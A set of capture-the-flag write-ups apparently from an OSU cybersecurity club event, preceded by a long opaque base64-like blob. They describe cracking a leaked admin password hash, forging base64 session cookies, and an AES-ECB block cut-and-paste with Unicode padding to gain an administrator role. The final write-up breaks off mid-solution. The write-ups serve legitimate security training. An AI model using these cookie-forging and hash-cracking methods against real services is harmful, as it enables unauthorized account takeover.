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

-----

Challenge: subdomain
Write-Up Author: ctf-user-006
# subdomain

Using [Sublist3r](https://github.com/aboul3la/Sublist3r) we can get a list of subdomains. One that looks interesting is: `9vyloyc3ojspmtuhtm6ejq.osucyber.club`. However, scanning it with `nmap` only shows a few ports that don't seem to lead any where (`22`, `80`, `443`). Any HTTP request returns a 404. But the challenge also mentions that the site was recently taken down, so we can maybe check on `web.archive.org` to find an old version. Indeed, we can find https://web.archive.org/web/20201022183102/http://9vyloyc3ojspmtuhtm6ejq.osucyber.club/. Inspecting the source of the page and searching for `osuctf`, we find: `<!-- osuctf{wayback_mach1n3_mucks_fichigan} -->`

-----

Challenge: authbot
Write-Up Author: ctf-user-029
Beginner: authbot
I've first tried all the commands for the authbot.
$ping
$coinflip
$auth
$help
$info
A link to github was given in $info (https://github.com/qxxxb/auth_bot).
I looked at the link for the auth function (line 110) and i realised that i need the value for the variable cipher, which is in sha256.
I also realised that there is a debug_log function that isn't given in discord. Thus, i called the function and it gave the password password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34. I went over to http://reverse-hash-lookup.online-domain-tools.com/ and deciphered the password with sha256 and got the password gobucks. Then i $auth gobucks and was authenticated as the admin and went to the auth-bot flag in BuckeyeCTF to get the flag


-----

Challenge: Cookie Monster Pt. 0
Write-Up Author: ctf-user-006
## Cookie Monster Pt. 0

Looking at the source code, we seem to be storing a cookie named `SESSIONID0` with login credentials. This cookie is set whenever the login form is submitted:
```py
        if form := request.form:
            try:
                cookie = create_session(form.get('username', ''))
                res.set_cookie(current_app.config.get('COOKIE_ID', 'SESSIONID'), cookie.decode('ascii'), max_age=3600)
            except SessionError as e:
                return redirect(url_for('login', err=e.args))
        return res
```

Looking at the `create_session()` function more closely, we see a few interesting things:
```py
        session = {
            'name': username,
            'role': 'users'
        }
        cookie_data = json.dumps(session, separators=(',', ':'), sort_keys=True).encode('ascii', errors='replace')
        return base64.b64encode(cookie_data)
```

Basically this returns the value of the `SESSIONID0` cookie. We see that in the `flag()` function, this value is checked like so:
```py
        if session.get('role', 'users') == 'admin':
            flag_text = current_app.config['FLAG']
```

As long as we have the `admin` role, we can get the flag! So next we can manually Base64 encode `{"name":"12345","role":"admin"}`, and set the cookie to that value using your browser's developer tools. If we click the login button, we get the flag.

-----

Challenge: flagbin
Write-Up Author: ctf-user-018
Found http://pwn.osucyber.club:13370/sitemap.xml in the http://pwn.osucyber.club:13370/robots.txt file. Created a .sh file to curl each url. Had > 1000 urls.


ex file.sh limited to 3 urls:
- curl http://pwn.osucyber.club:13370/paste/48e03df4-9d0a-42ba-8b67-c0d25c2e148e
- curl http://pwn.osucyber.club:13370/paste/7b4c4ce5-7b61-550a-9918-3efe006ed13b
- curl http://pwn.osucyber.club:13370/paste/381bea2b-6ef8-56ef-831b-f03540e7b6e8

Ran the .sh file to output file and grepped for "osu".

-----

Challenge: debugger
Write-Up Author: ctf-user-082
Began by uploading the pwn file and opening it with gdb. Began by opening the .c file to see what is happening. Saw that the  decrypted flag was produced after the four loop. So I started by setting a break point at main, the used the "step" command until I was at the start of the loop and then  used "step 64" to produce the flag. Finally, I used p"print decrypted_flag" to display the flag.

-----

Challenge: authbot
Write-Up Author: ctf-user-082
Start with $help in a dm to the AuthBot,  Gave us 

$ping
$coinflip
$auth
$help
$info
I then typed $info and navigated to the gitHub. After reviewing the files I scrolled down to the bottom and noticed a command $debug_log. So I typed that and got 

2020-10-23 23:39:08 INFO    
Logged in as authbot#4452
2020-10-23 23:39:13 
DEBUG    User ath0#0294 authed as admin with password hash
c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34

2020-10-23 23:40:06 DEBUG    User qxxxb#8938 authed as admin with password hash
c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34

2020-10-24 00:05:53 DEBUG    User tips48#3559 authed as admin with password hash
c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34

Pretty much password hashes were stored here. So I used https://crackstation.net/ and input the password hash. This gave the password gobucks. I then used $auth gobucks to give me the authentication role, which gave access to the #authbot-flag channel where the flag was/

-----

Challenge: Logo
Write-Up Author: ctf-user-029
Beginner: Logo
Just upload the image to this website:https://29a.ch/photo-forensics/#level-sweep and you will be able to see the flag. Had to mess around the website options a little before the level sweep shows me the flag

-----

Challenge: Tripped Over a String
Write-Up Author: ctf-user-029
Beginner: Tripped Over a String
Download the file, then go to https://hexed.it/. Upload it and search for ctf and you will get the flag.

-----

Challenge: Cookie Monster Pt. 0
Write-Up Author: ctf-user-029
Beginner: Cookie Monster Pt. 0
First, i went to the webside and looked at the source code: view-source:http://pwn.osucyber.club:13382/source.  if session.get('role', 'users') == 'admin': (line45) picked up my attention that i had to make the cookie have the value admin somehow. I realised that it was encoded in base64 and decoded my cookie content (eyJuYW1lIjoiYWRtaW4iLCJyb2xlIjoidXNlcnMifQ==) and got {"name":"admin","role":"users"}. Then i went ahead and encoded {"name":"admin","role":"admin"} and got eyJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==. Then, i used burpsite to change the cookie value to eyJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==, forward the request and then found the flag.

-----

Challenge: Magic Magic Bytes
Write-Up Author: ctf-user-029
Beginner: Magic Magic Bytes
Simply go to https://hexed.it/ and upload the file. Select tools>file format identification and it would say that it is a zip file. Next, change the extension to .zip and you would find another zip file inside it. Upload that second zipfile to the website and you will get your flag.

-----

Challenge: I'm a belieber
Write-Up Author: ctf-user-115
Good lord. Okay, first, download the binary ninja tools from https://github.com/SiD3W4y/binja-toolkit.

Next, load the binary and add the map (the given mapfile is close to the right format, just change tags to lowercase and remove sizes). This will let us....actually reverse it. 

If we look at the conspicuously named `check_key` function we see:
![hlil](https://imgur.com/a/F8mzrdh)

In this function we see a few branches. First, we know by pressing random stuff that `start` makes Justin blink ;) so we can gather that's what is doing `switch_bg()`. Next, we have some math I didn't bother reversing followed by a couple checks. First, if we have `key_val == 8` or the division result doesn't equal the original input value, we reset the keyArrIndex to zero. Next, we know at the bottom that we want keyArrIndex > 0xa in order to print the flag. Could we just get the flag? Maybe. But as we'll see, the flag is just our input, so that is a harder problem. Instead what we want to do is use mgba to set 3 breakpoints:

1. 0x8000418 -> we need to have a breakpoint if our input was correct
2. 0x80003ae -> we need to have a breakpoint if our input was wrong
3. 0x80003de -> once we pass the check, to make sure we don't miss the flag

From there we can just use mgba to bash the sequence. Start with A, if we hit the correct breakpoint we know the correct input is A, if we don't, it's B. How do I know it's either A or B for each? The value in r0 is always 1 or 2, which corresponds to A or B by uh...inspection or something.

If we bash out the whole 10 character key and hit `c` we get the flag printed out onscreen.



-----

Challenge: Tripped Over a String
Write-Up Author: ctf-user-015
To begin,  I opened the file in a hexadecimal program to see what type of file this was. Knowing that it was an .elf file, I ran it on the linux command line, which printed out the message that the the string got tripped on and the flag was scrambled up. So i took a look at the strings in the file using the command strings filename, and found the flag in the list.

-----

Challenge: what_even_is_a_cornhusker
Write-Up Author: ctf-user-015
Using the application steghide given to us in the linux vm, I tried to extract a hiddle text file in the jpg, after a few guesses of the password, I tried what_even_is_a_cornhusker as the password, which worked and revealed the flag in a hidden text file.

-----

Challenge: undelete
Write-Up Author: ctf-user-015
using the command gzip -d battelle_files.tar.gz to get a tar file
then use tar -xvf battelle_files.tar
open the text file called flag and you get the flag

-----

Challenge: sus
Write-Up Author: ctf-user-017
Looking at the binary, it appears to be a wireshark pcap file. Opening it in wireshark, we get a bunch of packet captures. Most of the data in these packets is pretty random, at the start it says Cxxd -p shellcode, and at the end it says EDontCallMeSecurely and Ccat flag.txt. I get a general idea that the random data is shellcode in the middle, and a flag at the bottom, but the flag is unreadable. 

Since I can't read the "flag", I use a data.data filter and the follow TCP stream function in wireshark to see all of the data in each packet recombined into one big file. I can download this file using the download raw function.

Now that I have the shellcode (as well as some extra junk (cat, xxd, flag commands)), I convert the shellcode from hex ascii bytes to a binary file using the xxd -p -r function. The -r flag reverses the regular xxd operation. Next, I try and run the binary file I created from the xxd command, but it segfaults. Darn...

I guess I have to do static analysis in Ghidra. I open the binary in Ghidra, and go to the main function, which looks like [this](https://i.imgur.com/p2JN3H6.png). There are two "commands". "E" for encryption, and "C" for printing stuff out. If you go into the function I liked to call notprintf, you find that if an "E" command is run, the encrypt flag turns on and the next command will be encrypted. Since EDontCallMeSecurely was followed by Ccat flag.txt, the flag was encrypted with AES. 

Now the hardest part was decrypting the damn thing. Online tools were shit, and trying to use the linux openssl commands led to a lot of dead ends. I eventually was looking at the AES in the crypto challenges using python, and tried to adapt it to my own purposes, using AES-256-ECB mode. At first it didn't work, because my key was too long. After I changed the key from DontCallMeSecurely to DontCallMeSecure, which is 16 bytes, it worked, and the flag was printed out. I used the cat flag.txt output as ciphertext btw. I had to guess that DontCallMeSecurely was the key though, because I didn't see any reference to it under the E command in the disassembly.


-----

Challenge: Cookie Monster Pt. 1
Write-Up Author: ctf-user-006
## Cookie Monster Pt. 1

What sticks out the most is this section of the source code:
```python
session = {
    'name': username,
    'role': 'users'
}
cipher = AES.new(key=current_app.config['KEY'], mode=AES.MODE_ECB)
cookie_data = json.dumps(session, separators=(',', ':'), sort_keys=True).encode('ascii', errors='replace')
return base64.b64encode(cipher.encrypt(pkcs7_pad(cookie_data)))
```

AES with ECB mode is [insecure](https://crypto.stackexchange.com/a/20946), and a
quick Google brings up some [similar
challenges](https://dr3dd.gitlab.io/cryptography/2018/10/11/Simple-Attack-On-AES-ECB-Mode/)
from other CTFs.

Our goal is to make sure that `role` is set to `administrators`. Oddly enough,
the other parts of this challenge all use `admin` instead of `administrators`,
so there might be some significance here.

Anyway, we need to make sure that when the cookie is decoded, it results in
valid JSON with the correct role. Here is the code responsible for the decoding:
```python
cipher = AES.new(key=current_app.config['KEY'], mode=AES.MODE_ECB)
cookie_data = pkcs7_unpad(cipher.decrypt(base64.b64decode(cookie)))
return json.loads(cookie_data.decode('ascii', errors='replace'))
```

In summary:
```
To encode:
- Put username into session object (with hardcoded `users` role)
- Create AES cipher using KEY (using ECB mode)
- Stringify session JSON
- PKCS7 pad stringified JSON
- Encrypt with AES cipher
- Base 64 encode

To decode:
- Create AES cipher using KEY (using ECB mode)
- Base 64 decode
- Decrypt with AES cipher
- PKCS7 unpad
- String to JSON
```

Due to the nature of AES, there's [no feasible
way](https://crypto.stackexchange.com/a/63889) to obtain the key even if we
have plaintext and ciphertext pairs. So it looks our only hope is to do some
hackery to find a ciphertext that decodes to the JSON we want.

AES-128 in EBC mode will encrypt 16 byte (128 bit) blocks at a time. Each block
is encrypted in isolation. So the same block of plaintext always generates the
block of ciphertext.

So if we wanted to find the ciphertext of this plaintext block
`1234567890123456`, we would need the website to encrypt it for us. If we gave
that ciphertext block back to the website, it will always decrypt back to
`1234567890123456`.

Now the trick is to come up with `name` values we can enter into the website
that will result in the plaintext blocks we want.

This turns out to be the hardest part. After playing around for a bit, it
actually seems impossible to create inputs that result in the plaintext blocks
we need. For example, one of the plaintext blocks we need is this:
```
administrators",
```

In order to obtain this block we need to supply a name like
`xxxxxx_administrators`:
```
1234567890123456
{"name":"xxxxxx_
administrators",
"role":"users"}
```

However, `xxxxxx_administrators` is 21 characters long, and the maximum allowed
length is 20. Now it seems impossible to generate any useful plaintext blocks. I
was stuck here for about 3 HOURS until I realized something about this line of
code:
```python
if 5 <= len(username) <= 20:
```

To calculate the length of a string, doesn't Python just count the number of
characters, regardless of whether they're ASCII or unicode? What happens if we
put in a ton of Unicode characters like `😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀`?
```
{"name":"\ud83d\
ude00\ud83d\ude0
0\ud83d\ude00\ud
83d\ude00\ud83d\
ude00\ud83d\ude0
0\ud83d\ude00\ud
83d\ude00\ud83d\
ude00\ud83d\ude0
0\ud83d\ude00\ud
83d\ude00\ud83d\
ude00\ud83d\ude0
0\ud83d\ude00\ud
83d\ude00\ud83d\
ude00\ud83d\ude0
0\ud83d\ude00\ud
83d\ude00","role
":"users"}
```

What the heck?? Each of these Unicode characters expands to 6 characters. That
means our new maxium is `20 * 6` which is `120`. Now we can get the plaintext
blocks we need by mixing in these unicode characters to increase the length of
the JSON. For example, with `我_administrators`, we get:

```
{"name":"\u6211_
administrators", <- This is the block we want
"role":"users"}
```

Perfect! Now we have to find some other bits and pieces to create a valid JSON
string.

However, there's a big issue with double quotes. If we try to put in a `"` in
the input string, it gets escaped to `\"`. After getting stuck here for a few
more hours (I was trying to make Python accept single quotes, but that didn't
work), I realized that we could abuse whitespace to isolate a single character
in the plaintext block. Since JSON doesn't care about whitespace, it can still
be parsed without any issue.

After a lot of trial and error, I finally came up this list of plaintext blocks:
```
{"name":"xxxxxxx
xxxxxx","role":"
administrators",
"zzzzzzzzzzzzzzz
":              
"               
"               
}               
```

